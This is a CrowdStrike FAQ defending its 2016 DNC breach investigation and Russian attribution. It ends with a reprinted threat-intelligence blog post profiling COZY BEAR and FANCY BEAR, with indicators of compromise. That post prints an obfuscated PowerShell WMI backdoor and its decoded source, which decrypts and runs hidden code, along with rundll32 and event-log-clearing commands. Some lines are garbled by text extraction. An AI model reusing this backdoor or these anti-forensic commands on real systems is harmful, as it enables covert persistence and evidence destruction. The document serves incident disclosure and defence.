We began our work with the DNC on May 1, 2016, collecting\nintelligence and analyzing the breach. After conducting this analysis and identifying the adversaries on the network, on June 10, 2016 we\ninitiated a coordinated remediation event to ensure the intruders were removed and could not regain access. That remediation process lasted\napproximately 2-3 days and was completed on June 13, 2016.\n\n**Why did the DNC contact CrowdStrike?**\n\nThe DNC contacted CrowdStrike to respond to a suspected cyber attack impacting its network. The DNC was first alerted to the hack by the\n[FBI in September 2015. According to testimony by DNC IT contractor Yared Tamene Wolde-Yohannes, the FBI attributed the breach to the](https://intelligence.house.gov/uploadedfiles/ty54.pdf)\nRussian Government in September 2015 (page 7).\n\n**Why did the DNC hire CrowdStrike instead of just working with the FBI to investigate the hack?**\n\nThe FBI doesn’t perform incident response or network remediation services when organizations need to get back to business after a breach.\n\nCrowdStrike is a leader in protecting customers around the world from cyber threats. It is common for organizations to hire third-party industry\nexperts, like CrowdStrike, to investigate and remediate cyber attacks when they suspect a breach even if they are collaborating with law\n[enforcement. As John Carlin, former Assistant Attorney General for the National Security Division at The Department of Justice, testified](https://intelligence.house.gov/uploadedfiles/jc5.pdf)\nbefore the House Intelligence Committee (cited from page 21 of his testimony):\n\n_“A lot of — outside of any political organization, companies, most corporations, they often would use these third party contractors, who they_\n_hired through their own counsel, and maximize the control from the point of view of the victim.”_\n\n**Did CrowdStrike have proof that Russia hacked the DNC?**\n\nYes, and this is also supported by the U.S. Intelligence community and independent Congressional reports.\n\n[Following a comprehensive investigation that CrowdStrike detailed publicly, the company concluded in May 2016 that two separate Russian](https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/)\nintelligence-affiliated adversaries breached the DNC network.\n\nTo reference, CrowdStrike’s account of their DNC investigation, published on June 14, 2016, “CrowdStrike Services Inc., our Incident\n_[Response group, was called by the Democratic National Committee (DNC), the formal governing body for the US Democratic Party, to respond](https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0_story.html)_\n_to a suspected breach.

HENRY: We said that we had a high degree of confidence it was the Russian Government. And our analysts that looked at it and that\n\n_had looked at these types of attacks before, many different types of attacks similar to this in different environments, certain tools that_\n_were used, certain methods by which they were moving in the environment,and looking at the types of data that was being targeted, that_\n_it was consistent with a nation-state adversary and associated with Russian intelligence._\n\n**Have any other organizations concluded that Russia was behind the DNC hack?**\n\nYes. CrowdStrike’s conclusion that Russia was behind the DNC hack is supported by the U.S. Intelligence community and also by independent\n[Congressional reports. Most recently, the Senate Intelligence Committee released a report in April 2020 that validated the previous](https://urldefense.proofpoint.com/v2/url?u=https-3A__www.intelligence.senate.gov_sites_default_files_documents_Report-5FVolume4.pdf&d=DwMGaQ&c=08AGY6txKsvMOP6lYkHQpPMRA1U6kqhAwGa8-0QCg3M&r=eljL9UdZnEjPiHRYkjKRQ4M60a_TDl3E-klWZcoTLHM&m=nDDWp1pu9zkeYUUsuqLPM77vSN5SsbB6bAG8yw2uGB4&s=QhXi60CK95m8MTzfizmKC351MQ5PfyGCTlywr8qU428&e=)\n[conclusions of the Intelligence Community Assessment, published on January 6, 2017, all concluding that Russia was behind the DNC data](https://www.dni.gov/files/documents/ICA_2017_01.pdf)\nbreach.\n\nPage 157 of the Senate report states that the Select Committee on Intelligence “conducted an extensive examination of the intelligence\ndemonstrating Russia’s intrusions into DNC networks.“ Senator Richard Burr (R – North Carolina), who served as Chairman of the\nSenate Intelligence Committee at the time the report was issued, confirmed this finding: “The Committee found no reason to dispute the\nIntelligence Community’s conclusions.”\n[The Intelligence Community Assessment, published on January 6, 2017 also confirms that Russia was behind the DNC hack, stating on](https://www.dni.gov/files/documents/ICA_2017_01.pdf)\npage 2 of the report: “In July 2015, Russian intelligence gained access to Democratic National Committee (DNC) networks and\nmaintained that access until at least June 2016. This unclassified ODNI report was based on extensive classified intelligence collected by\nthe CIA, NSA, and FBI; the ODNI determined the classified intelligence should not be released in order to protect the sensitive sources\nand methods by which it was collected.\n\nIt’s also worth noting that other security companies, including Fidelis and FireEye have supported CrowdStrike’s analysis.\n\n**Does CrowdStrike have evidence that data was exfiltrated from the DNC network?**\n\nYes. Shawn Henry stated in his testimony to the House Intelligence Committee that CrowdStrike had indicators of exfiltration (page 32) and\n[that data had clearly left the network. Also, on page 2, the Intelligence Community Assessment also confirmed that the Russian intelligence](https://www.dni.gov/files/documents/ICA_2017_01.pdf)\nagency GRU “had exfiltrated large volumes of data from the DNC.”\n\n**Did CrowdStrike see in real-time the adversaries exfiltrate data and emails from the DNC network?**\n\nNo and that’s typical for incident response cases. In the vast majority of cyber investigations, incident responders don’t witness exfiltration in\nreal-time. In fact, often we are called in after theft has taken place. We collect forensics, evidence of prior activity on the network, map where\nthe adversary has gained access and prepare remediation plans.\n\nIn this particular case, CrowdStrike saw circumstantial evidence of data exfiltration from the DNC network. As a reference point circumstantial\nevidence is the type of evidence such as DNA analysis or fingerprints that are fully admissible in courts.\n\nShawn Henry stated in his testimony that CrowdStrike had indicators of exfiltration (page 32 of the testimony):\n\n_“Counsel just reminded me that, as it relates to the DNC’ we have indicators that data was exfiltrated. We did not have concrete evidence that_\n_data was exfiltrated from the DNC, but we have indicators that it was exfiltrated.’_\n\nand circumstantial evidence that data was taken as he states on page 75 ”so there is circumstantial evidence that it was taken” and page 76:\n\n_“MR. HENRY: So, to go back, because I think it’s important to characterize this. We didn’t have a network sensor in place that saw data leave’_\n_We said that the data Ieft based on the circumstantial evidence. That was a conclusion that we made. when I answered that question, I was_\n_trying to be as factually accurate’ I want to provide the facts. so I said that we didn’t have direct evidence’ But we made a conclusion that the_\n_data left the network.”_\n\nOn page 32 of the testimony, Henry also explains that\n\n_“We don’t have video of it happening, but there are indicators that it happened” and “we did not have concrete evidence that data was_\n_exfiltrated from the DNC, but we have indicators that it was exfiltrated.” As another reference point, the independent report by Special Counsel_\nRobert S. Mueller also cites the theft of documents from the DNC and DCCC on page 40, stating the following:\n\n_“Officers from Unit 26165 stole thousands of documents from the DCCC and DNC networks, including significant amounts of data pertaining to_\n_the 2016 U.S. federal elections. Stolen documents included internal strategy documents, fundraising data, opposition research, and emails_\n_from the work inboxes of DNC employees.”_\n\n\n-----\n\n**s t t ue t at pa t o t e e** **t at o** **appe ed a te C o dSt** **e** **as a eady e gaged by t e** **C**\n\nThis question about the specific timeline of the exfiltration is addressed directly by Shawn Henry in his testimony on page 26.\n\n_“MR. HENRY: So the analysis started the first day or two in May, and then that was about 4 to 6 weeks. I think, on June 10th, we started what_\n_we call the remediation event. so we collected enough intelligence. We identified where the adversaries were in the environment’ We came up_\n_with a remediation plan to say we see them in multiple locations. This – these are the actions that we need to execute in order to put a new_\n_infrastructure in place and to ensure that the adversaries don’t have access to the new infrastructure. So that would have been June 10th_\n_when we started. And we did the remediation event over a couple of days.”_\n\nOf note, it is a standard practice in incident response to first coordinate a remediation event to prevent the adversary from doing further\ndamage and following that to fully restore network functionality. We followed industry best practices to accomplish the fastest remediation path\nfor our customer.\n\nOn page 27 of Shawn Henry’s testimony, he further explains CrowdStrike’s role as incident responders:\n\n_“To be clear, our goal, my goal was to protect the client. We were hired to protect the client. We identified an adversary there. The goal was to_\n_make sure that the adversary was removed and the client had a clean environment with which to work.”_\n\n**Did any DNC endpoints protected by your technology get breached in subsequent attacks?**\n\nThere is no indication of subsequent breaches taking place on any DNC machine protected by CrowdStrike Falcon.\n\n**Do you have a comment about the allegation that Russia stole Democratic Party emails from John Podesta and then passed them to**\n**WikiLeaks?**\n\nCrowdStrike was not involved in investigating John Podesta’s email leaks. Henry says on page 62 of this testimony, he “has no relationship\nwith them [the Podesta emails].”\n\n**What is the timeline of the DNC hack?**\n\nAccording to public records, this is the timeline of the DNC hack that CrowdStrike was hired to investigate. :\n\n**[Beginning in July 2015: “Russian intelligence gained access to Democratic National Committee (DNC) networks ( page 2).](https://www.dni.gov/files/documents/ICA_2017_01.pdf)**\n**Sept. 25, 2015:** [An FBI agent contacted the DNC Information Technology director/contractor in charge of the DNC network, alerting him](https://intelligence.house.gov/uploadedfiles/ty54.pdf)\nto suspicious activity in the network and referencing the “Dukes” (p16), a well-known pseudonym in the cybersecurity community for\nRussian government actors. The FBI agent called the DNC again in October 2015, November 2015, December 2015 (p12) asking the\ncontractor to “corroborate, to look into specific activities that the FBI had noticed emanating from the DNC network that could be\nnefarious.” (p8)\n**Beginning in December 2015: Russian intelligence actors engaged in attacks on election systems, including scanning a**\n**[“widely used vendor of election systems,” according to DHS.

George is an American entrepreneur and recognized security expert,\nauthor, entrepreneur, and speaker. He also started Foundstone, a worldwide security products and services company that was acquired by\nMcAfee in 2004.\n\nCrowdStrike’s Co-founder Dmitri Alperovitch is a Russia-born U.S. citizen, who has spent all of his adult life in the United States, and has no\nconnection to Ukraine.\n\nAs a public company our ownership is available on the SEC gov website\n\n\n-----\n\n**o you sta d be** **d you** **o** **o t e** **C**\n\nAs we’ve repeatedly stated, we stand by the findings and analysis of our investigation, and, as detailed in our company statement, we’ve\nprovided all forensic evidence and analysis to the FBI as requested. Additionally, our findings have been supported by the U.S. intelligence\ncommunity and other cybersecurity companies.\n\nThe investigation is detailed on our blog below.\n\n**Did you comply with FBI’s requests for information?**\n\nWe’ve provided all forensic evidence and analysis to the FBI related to the DNC investigation as requested. We have never declined any\nrequest for information from the FBI related to this investigation, and there are no pending requests for information by the FBI.\n\n**Do you have the DNC servers?**\n\nWe have never taken physical possession of any DNC servers. When cyber investigators respond to an incident, they capture that evidence in\na process called “imaging.” It involves making an exact byte-for-byte copy of the hard drives. They do the same for the machine’s memory,\ncapturing evidence that would otherwise be lost at the next reboot, and they monitor and store the traffic passing through the victim’s network.\nThis has been standard procedure in incident response investigations for decades. The images, not the computer’s hardware, provide the\nevidence.\n\nOur cloud-native, crowdsourced approach to solving cybersecurity enables us to deliver state- of-the-art protection to organizations big and\nsmall. Consequently, we are proud that customers from every major industry, level of government, and political affiliation turn to CrowdStrike to\nstop breaches.\n\n**Are you affiliated with the Democratic party?**\n\nCrowdStrike is not affiliated with any political party. We are a public cybersecurity company, and are non-partisan. We have done cybersecurity\nwork for, and currently protect, both Republican and Democratic political organizations at the state, local, and federal level, and we have\nthousands of non-political companies and organizations as customers.\n\n**Do you have Secretary Hillary Clinton’s email server? Have you ever had access to her emails?**\n\nNo. We have never worked for Secretary Clinton or her campaign, and never had access to her server or emails.\n\n**Where can I find more information?**\n\nMany news outlets have written about CrowdStrike’s investigation of the DNC hack and subsequent comments made by President Trump.

and findings identifying two separate Russian intelligence-affiliated adversaries present in the DNC\nnetwork in May 2016. On June 15, 2016 a blog post to a WordPress site authored by an individual using the moniker Guccifer 2.0\nclaimed credit for breaching the Democratic National Committee. This blog post presents documents alleged to have originated from the DNC.\n\nWhether or not this posting is part of a Russian Intelligence disinformation campaign, we are exploring the documents’ authenticity and origin.\nRegardless, these claims do nothing to lessen our findings relating to the Russian government’s involvement, portions of which we have\ndocumented for the public and the greater security community.\n\n**June 14, 2016**\n\n## Bears in the Midst: Intrusion Into the Democratic National Committee\n\n**By Dmitri Alperovitch**\n\nThere is rarely a dull day at CrowdStrike where we are not detecting or responding to a breach at a company somewhere around the globe. In\nall of these cases, we operate under strict confidentiality rules with our customers and cannot reveal publicly any information about these\nattacks. But on rare occasions, a customer decides to go public with information about their incident and give us permission to share our\nknowledge of the adversary tradecraft with the broader community and help protect even those who do not happen to be our customers. This\nstory is about one of those cases.\n\n[CrowdStrike Services Inc., our Incident Response group, was called by the Democratic National Committee (DNC), the formal governing body](https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0_story.html)\nfor the US Democratic Party, to respond to a suspected breach. We [deployed our IR team and technology and immediately identified two](https://www.crowdstrike.com/services/incident-response-remediation/)\n[sophisticated adversaries on the network – COZY BEAR and](https://www.crowdstrike.com/blog/who-is-cozy-bear/) [FANCY BEAR. We’ve had lots of experience with both of these actors attempting](https://www.crowdstrike.com/blog/who-is-fancy-bear/)\n[to target our customers in the past and know them well. In fact, our team considers them some of the best threat actors out of all the numerous](https://www.crowdstrike.com/blog/meet-the-adversaries/)\nnation-state, criminal and hacktivist/terrorist groups we encounter on a daily basis. Their tradecraft is superb, operational security second to\nnone and the extensive usage of ‘living-off-the-land’ techniques enables them to easily bypass many security solutions they encounter. In\nparticular, we identified advanced methods consistent with nation-state level capabilities including deliberate targeting and ‘access\nmanagement’ tradecraft – both groups were constantly going back into the environment to change out their implants, modify persistent\nmethods, move to new Command & Control channels and perform other tasks to try to stay ahead of being detected. Both adversaries engage\nin extensive political and economic espionage for the benefit of the government of the Russian Federation and are believed to be closely linked\nto the Russian government’s powerful and highly capable intelligence services.\n\nCOZY BEAR (also referred to in some industry reports as CozyDuke or APT 29) is the adversary group that last year successfully infiltrated\n[the unclassified networks of the White House,](http://www.thedailybeast.com/articles/2015/04/08/obama-to-putin-stop-hacking-me.html) [State Department, and](http://www.cnn.com/2015/03/10/politics/state-department-hack-worst-ever/) [US Joint Chiefs of Staff. In addition to the US government, they have](https://www.theguardian.com/technology/2015/aug/06/us-military-joint-chiefs-hacked-officials-blame-russia)\ntargeted organizations across the Defense, Energy, Extractive, Financial, Insurance, Legal, Manufacturing Media, Think Tanks,\nPharmaceutical, Research and Technology industries, along with Universities. Victims have also been observed in Western Europe, Brazil,\nChina, Japan, Mexico, New Zealand, South Korea, Turkey and Central Asian countries. COZY BEAR’s preferred intrusion method is a broadly\ntargeted spearphish campaign that typically includes web links to a malicious dropper. Once executed on the machine, the code will deliver\none of a number of sophisticated Remote Access Tools (RATs), including AdobeARM, ATI-Agent, and MiniDionis. On many occasions, both the\ndropper and the payload will contain a range of techniques to ensure the sample is not being analyzed on a virtual machine, using a debugger,\nor located within a sandbox. They have extensive checks for the various security software that is installed on the system and their specific\nconfigurations. When specific versions are discovered that may cause issues for the RAT, it promptly exits. These actions demonstrate a wellresourced adversary with a thorough implant-testing regime that is highly attuned to slight configuration issues that may result in their\ndetection, and which would cause them to deploy a different tool instead. The implants are highly configurable via encrypted configuration files,\nwhich allow the adversary to customize various components, including C2 servers, the list of initial tasks to carry out, persistence mechanisms,\nencryption keys and others. An HTTP protocol with encrypted payload is used for the Command & Control communication.\n\nFANCY BEAR (also known as Sofacy or APT 28) is a separate Russian-based threat actor, which has been active since mid 2000s, and has\nbeen responsible for targeted intrusion campaigns against the Aerospace, Defense, Energy, Government and Media sectors. Their victims\nhave been identified in the United States, Western Europe, Brazil, Canada, China, Georgia, Iran, Japan, Malaysia and South Korea. Extensive\ntargeting of defense ministries and other military victims has been observed, the profile of which closely mirrors the strategic interests of the\nRussian government, and may indicate affiliation with Главное Разведывательное Управление (Main Intelligence Department) or GRU,\nRussia’s premier military intelligence service. This adversary has a wide range of implants at their disposal, which have been developed over\nthe course of many years and include Sofacy, X-Agent, X-Tunnel, WinIDS, Foozer and DownRage droppers, and even malware for Linux,\nOSX, IOS, Android and Windows Phones. This group is known for its technique of registering domains that closely resemble domains of\nlegitimate organizations they plan to target. Afterwards, they establish phishing sites on these domains that spoof the look and feel of the\nvictim’s web-based email services in order to steal their credentials. FANCY BEAR has also been linked publicly to intrusions into the German\nBundestag and [France’s TV5 Monde TV station in April 2015.](http://www.bbc.com/news/world-europe-33072034)\n\nAt DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in\nApril 2016. We have identified no collaboration between the two actors, or even an awareness of one by the other. Instead, we observed the\ntwo Russian espionage groups compromise the same systems and engage separately in the theft of identical credentials. While you would\nvirtually never see Western intelligence agencies going after the same target without de-confliction for fear of compromising each other’s\n\n\n-----\n\nope at o s, uss a t s s ot a u co o sce a o ut s yd a s de [uss a s](http://www.ecfr.eu/publications/summary/putins_hydra_inside_russias_intelligence_services) te ge ce Se ces, a ece t pape o u opea\nCouncil on Foreign Relations, does an excellent job outlining the highly adversarial relationship between Russia’s main intelligence services –\nФедеральная Служба Безопасности (FSB), the primary domestic intelligence agency but one with also significant external collection and\n‘active measures’ remit, Служба Внешней Разведки (SVR), the primary foreign intelligence agency, and the aforementioned GRU. Not only\ndo they have overlapping areas of responsibility, but also rarely share intelligence and even occasionally steal sources from each other and\ncompromise operations. Thus, it is not surprising to see them engage in intrusions against the same victim, even when it may be a waste of\nresources and lead to the discovery and potential compromise of mutual operations.\n\nThe COZY BEAR intrusion relied primarily on the SeaDaddy implant developed in Python and compiled with py2exe and another Powershell\nbackdoor with persistence accomplished via Windows Management Instrumentation (WMI) system, which allowed the adversary to launch\n[malicious code automatically after a specified period of system uptime or on a specific schedule. The Powershell backdoor is ingenious in its](https://www.crowdstrike.com/blog/is-there-such-a-thing-as-a-malicious-powershell-command/)\nsimplicity and power. It consists of a single obfuscated command setup to run persistently, such as:\n\npowershell.exe -NonInteractive -ExecutionPolicy Bypass -EncodedCommand\nZgB1AG4AYwB0AGkAbwBuACAAcABlAHIAZgBDAHIAKAAkAGMAcgBUAHIALAAgACQAZABhAHQAYQApAA0ACgB7AA0ACgAJACQAcgBlAHQ\n\n**This decodes to:**\n\nfunction perfCr($crTr, $data){\n$ret = $null\ntry{\n$ms = New-Object System.IO.MemoryStream\n$cs = New-Object System.Security.Cryptography.CryptoStream -ArgumentList @($ms, $crTr,\n\n[System.Security.Cryptography.CryptoStreamMode]::Write)\n$cs.Write($data, 0, $data.Length)\n$cs.FlushFinalBlock()\n$ret = $ms.ToArray()\n$cs.Close()\n$ms.Close()\n}\ncatch{}\nreturn $ret\n}\nfunction decrAes($encData, $key, $iv)\n{\n$ret = $null\ntry{\n$prov = New-Object System.Security.Cryptography.RijndaelManaged\n$prov.Key = $key\n$prov.IV = $iv\n$decr = $prov.CreateDecryptor($prov.Key, $prov.IV)\n$ret = perfCr $decr $encData\n}\nCatch{}\nreturn $ret\n}\nfunction sWP($cN, $pN, $aK, $aI)\n{\nif($cN -eq $null -or $pN -eq $null){return $false}\ntry{\n$wp = ([wmiclass]$cN).Properties[$pN].Value\n$exEn = [Convert]::FromBase64String($wp)\n$exDec = decrAes $exEn $aK $aI\n$ex = [Text.Encoding]::UTF8.GetString($exDec)\nif($ex -eq $null -or $ex -eq ”)\n{return}\nInvoke-Expression $ex\nreturn $true\n}\ncatch{\nreturn $false\n\n$aeK = [byte[]] (0xe7, 0xd6, 0xbe, 0xa9, 0xb7, 0xe6, 0x55, 0x3a, 0xee, 0x16, 0x79, 0xca, 0x56, 0x0f, 0xbc, 0x3f, 0x22, 0xed, 0xff, 0x02, 0x43,\n0x4c, 0x1b, 0xc0, 0xe7, 0x57, 0xb2, 0xcb, 0xd8, 0xce, 0xda, 0x00)\n\n\n-----\n\n$ae [byte[]] (0 be, 0 a, 0 90, 0 d9, 0 d5, 0, 0 aa, 0 6d, 0 e9, 0 6, 0 6, 0 d, 0 9, 0 6, 0 c0, 0 6 )\nsWP ‘Wmi’ ‘Wmi’ $aeK $aeI | Out-Null\nThis one-line powershell command, stored only in WMI database, establishes an encrypted connection to C2 and downloads additional\npowershell modules from it, executing them in memory. In theory, the additional modules can do virtually anything on the victim system. The\nencryption keys in the script were different on every system. Powershell version of credential theft tool MimiKatz was also used by the actors to\nfacilitate credential acquisition for lateral movement purposes.\n\nFANCY BEAR adversary used different tradecraft, deploying X-Agent malware with capabilities to do remote command execution, file\ntransmission and keylogging. It was executed via rundll32 commands such as:\n\nrundll32.exe “C:\\Windows\\twain_64.dll”\n\nIn addition, FANCY BEAR’s X-Tunnel network tunneling tool, which facilitates connections to NAT-ed environments, was used to also execute\nremote commands. Both tools were deployed via RemCOM, an open-source replacement for PsExec available from GitHub. They also\nengaged in a number of anti-forensic analysis measures, such as periodic event log clearing (via wevtutil cl System and wevtutil cl Security\ncommands) and resetting timestamps of files.\n\nIntelligence collection directed by nation state actors against US political targets provides invaluable insight into the requirements directed\nupon those actors. Regardless of the agency or unit tasked with this collection, the upcoming US election, and the associated candidates and\nparties are of critical interest to both hostile and friendly nation states. The 2016 presidential election has the world’s attention, and leaders of\nother states are anxiously watching and planning for possible outcomes. Attacks against electoral candidates and the parties they represent\nare likely to continue up until the election in November.\n\nIndicators of Compromise:\n\n\n**IOC** **Adversary** **IOC**\n**Type**\n\n\n**Additional Info**\n\n\n6c1bce76f4d2358656132b6b1d471571820688ccdbaca0d86d0ca082b9390536 COZY\nBEAR\n\nb101cd29e18a515753409ae86ce68a4cedbe0d640d385eb24b9bbb69cf8186ae COZY\nBEAR\n\n185[.]100[.]84[.]134:443 COZY\nBEAR\n\n58[.]49[.]58[.]58:443 COZY\nBEAR\n\n218[.]1[.]98[.]203:80 COZY\nBEAR\n\n187[.]33[.]33[.]8:80 COZY\nBEAR\n\nfd39d2837b30e7233bc54598ff51bdc2f8c418fa5b94dea2cadb24cf40f395e5 FANCY\nBEAR\n\n4845761c9bed0563d0aa83613311191e075a9b58861e80392914d61a21bad976 FANCY\nBEAR\n\n40ae43b7d6c413becc92b07076fa128b875c8dbb4da7c036639eccf5a9fc784f FANCY\nBEAR\n\n185[.]86[.]148[.]227:443 FANCY\nBEAR\n\n45[.]32[.]129[.]185:443 FANCY\nBEAR\n\n23[.]227[.]196[.]217:443 FANCY\nBEAR\n\n**Interested in learning more about CrowdStrike’s Falcon platform?**\n\n\nSHA256 pagemgr.exe (SeaDaddy\nimplant)\n\nSHA256 pagemgr.exe\n(SeaDaddy implant)\n\nC2 SeaDaddy implant C2\n\nC2 SeaDaddy implant C2\n\nC2 Powershell implant C2\n\nC2 Powershell implant C2\n\nSHA256 twain_64.dll\n(64-bit X-Agent implant)\n\nSHA256 VmUpgradeHelper.exe (X-Tunnel\nimplant)\n\nSHA256 VmUpgradeHelper.exe\n(X-Tunnel implant)\n\nC2 X-Agent implant C2\n\nC2 X-Tunnel implant C2\n\nC2 X-Tunnel implant C2\n\n\n-----",
